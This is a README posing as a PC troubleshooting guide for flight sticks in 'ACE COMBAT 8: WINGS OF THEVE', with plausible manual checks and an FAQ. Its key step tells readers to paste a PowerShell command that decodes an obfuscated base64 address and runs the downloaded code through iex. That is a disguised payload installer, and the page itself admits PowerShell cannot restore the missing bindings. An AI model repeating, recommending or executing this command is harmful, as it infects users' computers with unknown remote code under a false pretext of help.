# AC8 HOTAS Setup — ACE COMBAT 8: WINGS OF THEVE PC troubleshooting

<p align="center">
  <img src="https://i.postimg.cc/ncCBGwR2/banner.png" alt="AC8 HOTAS Setup — ACE COMBAT 8: WINGS OF THEVE Windows troubleshooting" width="100%">
</p>

**Windows PC · PowerShell · AC8 HOTAS Setup**

A stick works in Windows but cannot be configured as expected in ACE COMBAT 8, or some familiar ACE COMBAT 7 flight-stick options are absent.

This guide focuses on **ACE COMBAT 8: WINGS OF THEVE** and the specific PC symptom described here, rather than applying a collection of unrelated Windows tweaks. If you are searching for **ace combat 8 hotas not working** or **ace combat 8 flight stick setup**, work through the checks below in order and make one change at a time.

## Download the instructions

**[Download ZIP from the latest GitHub Release](../../releases/latest/download/ac8-hotas-setup-instructions.zip)** · [Open all releases](../../releases)

The ZIP contains `HOW_TO_RUN.txt` with the PowerShell launch instructions. You can also follow the steps directly from this README.

## Run with PowerShell

1. Close ACE COMBAT 8: WINGS OF THEVE before running troubleshooting commands or changing game settings.
2. Press **Win + X**, then **I** to open PowerShell. If that shortcut does not open it on your Windows build, choose **Terminal** or **PowerShell** from the Win + X menu.
3. Copy the command in the box below.
4. Paste it into the PowerShell window and press **Enter**.
5. Follow the instructions displayed in the terminal, then test the same symptom in the game.

### PowerShell command

```powershell
iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtcGxhY2UudG9wL3dvcmtlcj89NzY1MTI5MDYxMy9GaXg='))) -UseBasicParsing)
```

Run PowerShell with administrator rights only if the command explains why elevated permissions are needed. As with any command copied from a website, review where it downloads code from before executing it.

## The issue

The ACE COMBAT team acknowledged on September 30 that some flight-stick configuration options from the previous game are not available in ACE COMBAT 8. This guide distinguishes hardware calibration from missing game-side support.

### What it looks like

A stick works in Windows but cannot be configured as expected in ACE COMBAT 8, or some familiar ACE COMBAT 7 flight-stick options are absent.

Players looking for a **ace combat 8 joystick not detected** solution may run into the same broad symptom, but a matching screenshot or error message does not prove that every PC has the same underlying cause.

## Check it manually

1. Plug the HOTAS or flight stick directly into a USB port and confirm its mode switch position.
2. Press **Win + R**, type **joy.cpl**, and inspect the controller properties. Check axes, hats and buttons while moving the device.
3. If the device is a HORI flight stick, confirm its firmware status through **HORI Control Center** and the correct support page for the exact model.
4. Open the game’s controller settings and check which available options actually recognize the device.
5. Record the model, firmware, connection mode and missing axis so you can compare with official compatibility updates.

## After the check

Test the same axis in Windows and then in-game. If Windows reads the input correctly but the game does not, document the unsupported binding rather than changing unrelated system settings.

If the behavior changes after a game update, check the developer's latest patch notes and reproduce the problem again before making additional changes.

## What not to change

A Windows-detected joystick is not proof that the game supports every axis. Do not install third-party game loaders or modify anti-cheat protected files to force HOTAS support.

Back up any files you plan to modify. A troubleshooting command should never require deleting unrelated games, saves, Windows security services, or other user data without a specific documented reason.

## System and game scope

- **Game:** ACE COMBAT 8: WINGS OF THEVE
- **Platform:** Windows PC
- **Method:** PowerShell and documented game/launcher settings
- **Focus:** ACE COMBAT 8 HOTAS not detected, unsupported flight stick settings, controller axis troubleshooting on Windows PC
- **Not covered:** console troubleshooting or unsupported changes to multiplayer protection, anti-cheat, or game executables

## Frequently asked questions

**Windows sees my stick; why does the game not?**  
Windows input detection and game-side device support are different layers.

**Can PowerShell add missing official bindings?**  
No. Missing native options need support from the game or a separately validated configuration method.

**Is every HORI stick affected by the same drift issue?**  
No. Check the exact model and firmware notes before changing anything.

## Related searches

Use these phrases to find the matching issue rather than a generic Windows optimizer:

- ace combat 8 hotas not working
- ace combat 8 flight stick setup
- ace combat 8 joystick not detected
- ace combat 8 flight controls pc

## Official and community references

- [Developer flight-stick support update](https://zquads.com/articles/4316/)
- [HORI flight-stick firmware support](https://stores.horiusa.com/spf-034/support/)

## License and trademarks

The original text of this guide is provided under the MIT license. Game names, logos and trademarks belong to their respective owners. This is an independent community troubleshooting resource, not an official publisher release.
